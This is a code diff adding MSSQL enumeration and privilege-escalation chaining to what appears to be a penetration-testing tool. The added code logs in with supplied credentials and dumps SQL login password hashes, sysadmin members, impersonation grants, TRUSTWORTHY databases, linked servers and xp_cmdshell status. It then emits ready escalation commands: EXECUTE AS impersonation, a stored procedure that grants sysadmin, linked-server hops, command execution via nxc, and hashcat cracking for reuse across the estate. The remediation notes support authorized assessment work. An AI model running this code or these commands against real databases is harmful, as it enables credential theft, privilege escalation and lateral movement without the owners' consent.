@@ -498,6 +498,207 @@ def run_nxc_mssql(ip: str, creds: dict, port: int = _DEFAULT_PORT,
     return parse_nxc_mssql(out), None
 
 
+# --- live enumeration via impacket-mssqlclient ----------------------------------
+# Each query's result is bracketed by sentinel SELECTs so we can extract it
+# robustly from impacket's tabular output. Every row is emitted as a single
+# '|'-delimited string (one column) so parsing is trivial and format-independent.
+_ENUM_SECTIONS = {
+    "server": "SELECT CAST(SERVERPROPERTY('MachineName') AS varchar(128))+'|'+"
+              "CAST(SYSTEM_USER AS varchar(128))+'|'+"
+              "CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(4))+'|'+"
+              "CAST(ISNULL(SERVERPROPERTY('IsIntegratedSecurityOnly'),0) AS varchar(4))+'|'+"
+              "CAST(SERVERPROPERTY('ProductVersion') AS varchar(64))",
+    "logins": "SELECT name+'|'+CAST(IS_SRVROLEMEMBER('sysadmin',name) AS varchar(4)) "
+              "FROM sys.server_principals WHERE type IN ('S','U','G') AND name NOT LIKE '##%'",
+    "databases": "SELECT name+'|'+CAST(is_trustworthy_on AS varchar(4))+'|'+"
+                 "ISNULL(SUSER_SNAME(owner_sid),'') FROM sys.databases",
+    "links": "SELECT name+'|'+ISNULL(product,'')+'|'+ISNULL(data_source,'') "
+             "FROM sys.servers WHERE is_linked=1",
+    "impersonate": "SELECT DISTINCT b.name+'|'+CAST(IS_SRVROLEMEMBER('sysadmin',b.name) "
+                   "AS varchar(4)) FROM sys.server_permissions a JOIN sys.server_principals b "
+                   "ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE'",
+    "config": "SELECT name+'|'+CAST(value_in_use AS varchar(8)) FROM sys.configurations "
+              "WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled')",
+    "hashes": "SELECT name+'|'+CONVERT(varchar(max),password_hash,1) FROM sys.sql_logins "
+              "WHERE password_hash IS NOT NULL",
+}
+
+
+def mssqlclient_tool() -> str | None:
+    from . import credenum
+    return credenum.impacket_tool("mssqlclient")
+
+
+def build_enum_script() -> str:
+    """The T-SQL fed to impacket-mssqlclient over stdin: each section wrapped in
+    @@B:<name>/@@E:<name> sentinels, then exit."""
+    lines = []
+    for name, q in _ENUM_SECTIONS.items():
+        lines.append(f"SELECT '@@B:{name}'")
+        lines.append(q)
+        lines.append(f"SELECT '@@E:{name}'")
+    lines.append("exit")
+    return "\n".join(lines) + "\n"
+
+
+def _run_stdin(cmd: list[str], data: str, timeout: int = 180) -> tuple[str, str | None]:
+    import subprocess
+    try:
+        p = subprocess.run(cmd, input=data, capture_output=True, text=True,
+                           errors="replace", timeout=timeout)
+        return (p.stdout or "") + (p.stderr or ""), None
+    except subprocess.TimeoutExpired:
+        return "", f"timed out after {timeout}s"
+    except (OSError, ValueError) as e:
+        return "", str(e)
+
+
+def parse_enum(output: str) -> dict:
+    """Pull each sentinel-wrapped section out of impacket-mssqlclient output.
+    Returns {section: [[col, ...], ...]} - each row split on '|'."""
+    import re
+    sections: dict[str, list] = {}
+    for name in _ENUM_SECTIONS:
+        m = re.search(rf"@@B:{name}\b(.*?)@@E:{name}\b", output, re.S)
+        rows = []
+        if m:
+            for line in m.group(1).splitlines():
+                line = line.strip()
+                if "|" in line and "----" not in line and not line.startswith("@@"):
+                    rows.append([c.strip() for c in line.split("|")])
+        sections[name] = rows
+    return sections
+
+
+def run_mssqlclient(ip: str, creds: dict, port: int = _DEFAULT_PORT,
+                    windows_auth: bool = True) -> tuple[dict | None, str | None]:
+    """Connect with impacket-mssqlclient and run the enumeration script. Returns
+    (sections, error). sections is None when the tool is missing or login failed."""
+    tool = mssqlclient_tool()
+    if not tool:
+        return None, "impacket-mssqlclient not installed"
+    user, secret, dom = creds.get("user", ""), creds.get("secret", ""), creds.get("domain", "")
+    if windows_auth and dom:
+        target = f"{dom}/{user}:{secret}@{ip}"
+        cmd = [tool, target, "-windows-auth"]
+    else:
+        target = f"{user}:{secret}@{ip}"
+        cmd = [tool, target]
+    if port and port != _DEFAULT_PORT:
+        cmd += ["-port", str(port)]
+    out, err = _run_stdin(cmd, build_enum_script())
+    if err:
+        return None, err
+    sections = parse_enum(out)
+    if not sections.get("server"):
+        return None, "login failed or nothing returned"
+    return sections, None
+
+
+def chains_from_enum(target: dict, enum: dict, creds: dict | None):
+    """Turn a live enumeration into concrete findings + a grounded escalation chain
+    for THIS instance. Returns (findings, chain_steps, summary)."""
+    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
+    ctx = _ctx(target, creds)
+    fs: list[dict] = []
+    chain: list[str] = []
+
+    server = enum.get("server") or []
+    me = (creds or {}).get("user", "")
+    is_sa = False
+    if server:
+        row = server[0]
+        me = row[1] if len(row) > 1 else me
+        is_sa = len(row) > 2 and row[2] == "1"
+        if len(row) > 4 and row[4] and not target.get("version"):
+            target["version"] = row[4]
+    target["live_login"] = me
+    if is_sa:
+        target["admin"] = True
+    else:
+        target.setdefault("access", True)
+
+    sysadmins = {r[0] for r in enum.get("logins", []) if len(r) > 1 and r[1] == "1"}
+
+    if is_sa:
+        chain.append(f"already sysadmin as {me}")
+        fs.append(_finding(
+            "critical", "Credentials are sysadmin on this MSSQL instance", tgt,
+            f"{me} is a member of the sysadmin server role (xp_cmdshell / RCE).",
+            "nxc / impacket-mssqlclient",
+            _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
+            "Least-privilege the login; remove sysadmin.", ["CWE-250", "CWE-269"]))
+
+    imp_sa = [r[0] for r in enum.get("impersonate", []) if len(r) > 1 and r[1] == "1"]
+    if imp_sa and not is_sa:
+        who = imp_sa[0]
+        chain.append(f"impersonate sysadmin login '{who}' (EXECUTE AS)")
+        fs.append(_finding(
+            "high", "Impersonatable sysadmin login (privesc to sysadmin)", tgt,
+            f"The login can EXECUTE AS LOGIN = '{who}', which is a sysadmin.",
+            "impacket-mssqlclient",
+            _fill(f"EXECUTE AS LOGIN = '{who}'; SELECT IS_SRVROLEMEMBER('sysadmin'); "
+                  "-- then run xp_cmdshell; REVERT", ctx),
+            "Remove IMPERSONATE grants pointing at sysadmin logins.", ["CWE-269"]))
+
+    trust = [r for r in enum.get("databases", []) if len(r) > 2 and r[1] == "1"]
+    trust_sa = [r for r in trust if r[2] in sysadmins
+                or r[2].lower() == "sa" or r[2].lower().endswith("\\sa")]
+    if trust_sa and not is_sa:
+        db = trust_sa[0][0]
+        chain.append(f"abuse TRUSTWORTHY db '{db}' (db_owner + EXECUTE AS OWNER)")
+        fs.append(_finding(
+            "high", "TRUSTWORTHY database owned by a sysadmin (privesc)", tgt,
+            f"Database '{db}' is TRUSTWORTHY and owned by a sysadmin - if you are "
+            f"db_owner there, escalate to sysadmin.", "impacket-mssqlclient",
+            _fill(f"USE [{db}]; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
+                  "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;", ctx),
+            "Turn off TRUSTWORTHY; don't set a sysadmin as the owner of a user DB.",
+            ["CWE-269"]))
+
+    links = [r[0] for r in enum.get("links", [])]
+    if links:
+        chain.append(f"hop linked server(s) {', '.join(links[:3])} (OPENQUERY / EXECUTE AT)")
+        fs.append(_finding(
+            "medium", f"{len(links)} linked server(s) reachable (lateral / privesc)", tgt,
+            "Linked servers: " + ", ".join(links[:8]) + ". Linked logins often map to "
+            "a privileged account (sa) on the remote.", "impacket-mssqlclient / mssqlpwner",
+            _fill("SELECT * FROM OPENQUERY([%s], 'SELECT SYSTEM_USER, "
+                  "IS_SRVROLEMEMBER(''sysadmin'')');" % links[0], ctx),
+            "Review linked-server login mappings; avoid mapping to sysadmin.", ["CWE-284"]))
+
+    cfg = {r[0]: r[1] for r in enum.get("config", []) if len(r) > 1}
+    if cfg.get("xp_cmdshell") == "1":
+        fs.append(_finding(
+            "high", "xp_cmdshell is enabled (OS command execution)", tgt,
+            "xp_cmdshell = 1 - run OS commands as the SQL service account now.",
+            "nxc / impacket-mssqlclient",
+            _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
+            "Disable xp_cmdshell; run SQL under a low-privilege gMSA.", ["CWE-250"]))
+
+    hashes = [r[0] for r in enum.get("hashes", [])]
+    if hashes:
+        fs.append(_finding(
+            "high", f"Recovered {len(hashes)} SQL login password hash(es)", tgt,
+            "Dumped sys.sql_logins hashes (" + ", ".join(hashes[:8]) + ") - crack "
+            "offline with hashcat -m 1731 and reuse across the estate.",
+            "impacket-mssqlclient",
+            "hashcat -m 1731 mssql_hashes.txt wordlist.txt",
+            "Rotate SQL logins; enforce a strong password policy.", ["CWE-522"]))
+
+    if not is_sa and not chain:
+        chain.append(f"low-priv login as {me} - hunt for a linked-server or db_owner path")
+    summary = {
+        "login": me, "is_sysadmin": is_sa, "sysadmins": sorted(sysadmins),
+        "logins": [r[0] for r in enum.get("logins", [])],
+        "databases": enum.get("databases", []),
+        "trustworthy": [r[0] for r in trust], "links": links,
+        "impersonate": [r[0] for r in enum.get("impersonate", [])],
+        "config": cfg, "hashes": hashes,
+    }
+    return fs, chain, summary
+
+
 # --- top-level analysis ---------------------------------------------------------
 
 def findings_to_vulns(fs: list[dict]) -> dict:
